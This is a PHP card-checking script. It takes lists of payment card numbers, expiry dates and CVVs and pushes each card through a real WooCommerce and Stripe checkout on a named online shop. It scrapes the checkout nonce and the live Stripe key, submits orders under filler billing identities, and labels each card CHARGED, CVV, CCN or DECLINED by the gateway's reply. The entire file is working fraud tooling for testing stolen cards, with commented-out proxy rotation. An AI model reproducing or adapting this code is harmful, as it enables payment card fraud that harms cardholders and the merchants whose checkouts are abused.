<?php

require "z.php";


/*
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
$headers[] = 'user-agent: '.$ua.'';
*/


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];


if (strlen($ano) == 4) {
    $ano = substr($ano, 2); // Return the last two digits
}


$startTime = microtime(true);


$endTime = microtime(true);
$overallTime = $endTime - $startTime;

/*function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();*/


//Cart
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: slicespark.com';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryUf1ap35wAOxbi4as';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'origin: https://slicespark.com';
$headers[] = 'referer: https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="add-to-cart"

147
------WebKitFormBoundaryUf1ap35wAOxbi4as--
');
$cart = curl_exec($ch);

//checkout
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: slicespark.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'referer: https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 0, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$cn = v($d ,'{"key":"pk_live','"');
$pk = 'pk_live'.$cn;
echo 'Nonce: '.$n.'<br>';
//echo 'cn: '.$key.'<br>';
//*/

//Payment method

//$email = 'jhefvrix%2B'.$first_name.'%40gmail.com';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'user-agent: '.$ua.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Tricia+Lansangan&billing_details[address][line1]=sw.+Floriana+4&billing_details[address][state]=NY&billing_details[address][city]=Markowice&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[email]=tricialansangan1%40gmail.com&billing_details[phone]=%2B639702998440&card[number]='.$cc.'&card[cvc]='.$cvv1.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e16b7c7b-683b-4548-849e-ccda83dff00b00bd98&muid=286cda67-ce04-4790-b489-d41dee11c8fc2cbb05&sid=04f4e61f-31cd-42fb-a19e-d6bf1b775cb84a5f6b&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+card-element&referrer=https%3A%2F%2Ffromolivestooil.com&time_on_page=307502&key=pk_live_lAcezjz852M45gxZmQ9taVTy');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Maek+Sy&billing_details[address][line1]=40+Hampton+Court+Rd&billing_details[address][state]=United+Kingdom&billing_details[address][city]=Sporle&billing_details[address][postal_code]=PE32+6EZ&billing_details[address][country]=GB&billing_details[email]=markopari076%40gmail.com&billing_details[phone]=077+0121+2964&card[number]='.$cc.'&card[cvc]='.$cvv1.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e16b7c7b-683b-4548-849e-ccda83dff00b00bd98&muid=2d0765fc-b93a-4b22-8609-6da5cb16335fa0554b&sid=0fa42d87-5a7c-46e6-8fa6-e4492ec4587a4e266e&payment_user_agent=stripe.js%2F49740bdf3e%3B+stripe-js-v3%2F49740bdf3e%3B+split-card-element&referrer=https%3A%2F%2Fslicespark.com&time_on_page=208084&key=pk_live_51PESOH2KamxNflXNFQbz3Z330duumZOtxWeWlFI8wmL9H1HgYtmoBDIpaxhVhWAYY6Przn3Xh5pm2jAvmykoGjES009LNd6BXt');
$curl = curl_exec($ch);

$data = json_decode($curl);
$pm = $data->id;

//Result

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: slicespark.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'referer:https://slicespark.com/checkout/';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'origin: https://slicespark.com';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Maek&billing_last_name=Sy&billing_country=GB&billing_address_1=40+Hampton+Court+Rd&billing_city=Sporle&billing_state=United+Kingdom&billing_postcode=PE32+6EZ&billing_phone=077+0121+2964&billing_email=markopari076%40gmail.com&shipping_first_name=Maek&shipping_last_name=Sy&shipping_country=GB&shipping_address_1=40+Hampton+Court+Rd&shipping_city=Sporle&shipping_state=United+Kingdom&shipping_postcode=PE32+6EZ&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fslicespark.com%2Fmy-account%2F&wc_order_attribution_session_start_time=2025-01-29+05%3A43%3A14&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F132.0.0.0+Safari%2F537.36+Edg%2F132.0.0.0&shipping_method%5B0%5D=free_shipping%3A1&payment_method=stripe&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$pm.'');
$a = curl_exec($ch);
$a;
//echo 'Token); .$Token.'<br>'
//echo $a.'<br>';
$ro2 = json_decode($a);
//echo $e;
$result = $ro2->result;
$message = trim(strip_tags($ro2->messages));
/*
$url = $ro2['redirect'];
$od = $ro2['order_id'];
*/
$endTime = microtime(true);
$overallTime = $endTime - $startTime;

if(strpos($message, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if(strpos($message, 'The card verification number does not match') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;">[$4] [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ STRIPE + WOO ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if(strpos($message, 'Insufficient funds in account') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if($message === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else if($message === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.' ] </div><br></div>';
}
curl_close($ch);
ob_flush();
unlink($cx);



?>